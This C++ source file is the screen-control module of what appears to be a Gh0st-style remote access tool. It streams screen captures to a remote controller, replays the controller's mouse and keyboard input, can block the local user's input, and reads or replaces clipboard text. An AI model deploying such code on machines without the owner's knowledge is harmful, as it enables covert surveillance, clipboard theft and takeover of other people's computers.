// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenManager.h"
#include "Common.h"
#include <IOSTREAM>
#if _MSC_VER <= 1200
#include <Winable.h>
#else
#include <WinUser.h>
#endif
#include <time.h>

#include "ScreenSpy.h"
#include "ScreenCapturerDXGI.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))

bool IsWindows8orHigher() {
	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
	if (!hMod) return false;

	RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
	if (!rtlGetVersion) return false;

	RTL_OSVERSIONINFOW rovi = { 0 };
	rovi.dwOSVersionInfoSize = sizeof(rovi);
	if (rtlGetVersion(&rovi) == 0) {
		return (rovi.dwMajorVersion > 6) || (rovi.dwMajorVersion == 6 && rovi.dwMinorVersion >= 2);
	}
	return false;
}

CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
	m_bIsWorking = TRUE;
	m_bIsBlockInput = FALSE;

	int DXGI = 0;
	BYTE algo = ALGORITHM_DIFF;
	if (!(user == NULL || (int)user == 1)) {
		UserParam* param = (UserParam*)user;
		if (param) {
			DXGI = param->buffer[0];
			algo = param->length > 1 ? param->buffer[1] : algo;
			delete param;
		}
	} else {
		DXGI = (int)user;
	}
	Mprintf("CScreenManager: Type %d Algorithm: %d\n", DXGI, int(algo));
	if ((1==DXGI && IsWindows8orHigher()))
	{
		auto s = new ScreenCapturerDXGI(algo);
		if (s->IsInitSucceed()) {
			m_ScreenSpyObject = s;
		}
		else {
			SAFE_DELETE(s);
			m_ScreenSpyObject = new CScreenSpy(32, algo);
			Mprintf("CScreenManager: DXGI SPY init failed!!! Using GDI instead.\n");
		}
	}
	else
	{
		m_ScreenSpyObject = new CScreenSpy(32, algo);
	}

	m_hWorkThread = CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
}


DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
{
	CScreenManager *This = (CScreenManager *)lParam;

	This->SendBitMapInfo(); //发送bmp位图结构

	// 等控制端对话框打开
	This->WaitForDialogOpen();   

	clock_t last = clock();
	This->SendFirstScreen();
#if USING_ZLIB
	const int fps = 8;// 帧率
#elif USING_LZ4
	const int fps = 8;// 帧率
#else
	const int fps = 8;// 帧率
#endif
	const int sleep = 1000 / fps;// 间隔时间（ms）
	int c1 = 0; // 连续耗时长的次数
	int c2 = 0; // 连续耗时短的次数
	float s0 = sleep; // 两帧之间隔（ms）
	const int frames = fps;	// 每秒调整屏幕发送速度
	const float alpha = 1.03; // 控制fps的因子
	timeBeginPeriod(1);
	while (This->m_bIsWorking)
	{
		ULONG ulNextSendLength = 0;
		const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
		if (szBuffer)
		{
			s0 = max(s0, 50); // 最快每秒20帧
			s0 = min(s0, 1000);
			int span = s0-(clock() - last);
			Sleep(span > 0 ? span : 1);
			if (span < 0) // 发送数据耗时较长，网络较差或数据较多
			{
				c2 = 0;
				if (frames == ++c1) { // 连续一定次数耗时长
					s0 = (s0 <= sleep*4) ? s0*alpha : s0;
					c1 = 0;
#ifdef _DEBUG
					Mprintf("[+]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
#endif
				}
			} else if (span > 0){ // 发送数据耗时比s0短，表示网络较好或数据包较小
				c1 = 0;
				if (frames == ++c2) { // 连续一定次数耗时短
					s0 = (s0 >= sleep/4) ? s0/alpha : s0;
					c2 = 0;
#ifdef _DEBUG
					Mprintf("[-]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
#endif
				}
			}
			last = clock();
			This->SendNextScreen(szBuffer, ulNextSendLength);
		}
	}
	timeEndPeriod(1);
	Mprintf("ScreenWorkThread Exit\n");

	return 0;
}

VOID CScreenManager::SendBitMapInfo()
{
	//这里得到bmp结构的大小
	const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER);
	LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, 
		ulLength, MEM_COMMIT, PAGE_READWRITE);
	if (szBuffer == NULL)
		return;
	szBuffer[0] = TOKEN_BITMAPINFO;
	//这里将bmp位图结构发送出去
	memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
	m_ClientObject->OnServerSending((char*)szBuffer, ulLength);
	VirtualFree(szBuffer, 0, MEM_RELEASE);
}

CScreenManager::~CScreenManager()
{
	Mprintf("ScreenManager 析构函数\n");

	m_bIsWorking = FALSE;

	WaitForSingleObject(m_hWorkThread, INFINITE);  
	if (m_hWorkThread!=NULL)
	{
		CloseHandle(m_hWorkThread);
	}

	delete m_ScreenSpyObject;
	m_ScreenSpyObject = NULL;
}

VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			NotifyDialogIsOpen();  
			break;
		}
	case COMMAND_SCREEN_CONTROL:
		{
			BlockInput(false);
			ProcessCommand(szBuffer + 1, ulLength - 1);
			BlockInput(m_bIsBlockInput);  //再恢复成用户的设置

			break;
		}
	case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
		{
			m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //鼠标键盘的锁定

			BlockInput(m_bIsBlockInput);

			break;
		}
	case COMMAND_SCREEN_GET_CLIPBOARD:
		{
			SendClientClipboard();
			break;
		}
	case COMMAND_SCREEN_SET_CLIPBOARD:
		{
			UpdateClientClipboard((char*)szBuffer + 1, ulLength - 1);
			break;
		}
	}
}


VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
		return;	
	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength);
	if (hGlobal != NULL) { 

		LPTSTR szClipboardVirtualAddress = (LPTSTR) GlobalLock(hGlobal); 
		if (szClipboardVirtualAddress == NULL)
			return;
		memcpy(szClipboardVirtualAddress, szBuffer, ulLength); 
		GlobalUnlock(hGlobal);         
		if(NULL==SetClipboardData(CF_TEXT, hGlobal))
			GlobalFree(hGlobal);
	}
	CloseClipboard();
}

VOID CScreenManager::SendClientClipboard()
{
	if (!::OpenClipboard(NULL))  //打开剪切板设备
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}
	size_t	  iPacketLength = GlobalSize(hGlobal) + 1;
	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal); //锁定 
	LPBYTE	szBuffer = new BYTE[iPacketLength];


	szBuffer[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
	::GlobalUnlock(hGlobal); 
	::CloseClipboard();
	m_ClientObject->OnServerSending((char*)szBuffer, iPacketLength);
	delete[] szBuffer;
}


VOID CScreenManager::SendFirstScreen()
{
	ULONG ulFirstSendLength = 0;
	LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData(&ulFirstSendLength);
	if (ulFirstSendLength == 0 || FirstScreenData == NULL)
	{
		return;
	}

	m_ClientObject->OnServerSending((char*)FirstScreenData, ulFirstSendLength + 1);
}

const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
{
	LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);

	if (ulNextSendLength == 0 || NextScreenData == NULL)
	{
		return NULL;
	}

	return (char*)NextScreenData;
}

VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
{
	m_ClientObject->OnServerSending(szBuffer, ulNextSendLength);
}

VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
{
	int msgSize = sizeof(MSG64);
	if (ulLength % 28 == 0)         // 32位控制端发过来的消息
		msgSize = 28;
	else if (ulLength % 48 == 0)    // 64位控制端发过来的消息
		msgSize = 48;
	else return;                    // 数据包不合法

	// 命令个数
	ULONG	ulMsgCount = ulLength / msgSize;

	// 处理多个命令
	BYTE* ptr = szBuffer;
	MSG32 msg32;
	MSG64 msg64;
	for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize)
	{
		MSG64* Msg = msgSize == 48 ? (MSG64*)ptr :
			(MSG64*)msg64.Create(msg32.Create(ptr, msgSize));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
			{
				POINT Point;
				Point.x = LOWORD(Msg->lParam);
				Point.y = HIWORD(Msg->lParam);
				m_ScreenSpyObject->PointConversion(Point);
				SetCursorPos(Point.x, Point.y);
				SetCapture(WindowFromPoint(Point));
			}
			break;
		default:
			break;
		}

		switch(Msg->message)   //端口发加快递费
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, 
				GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}
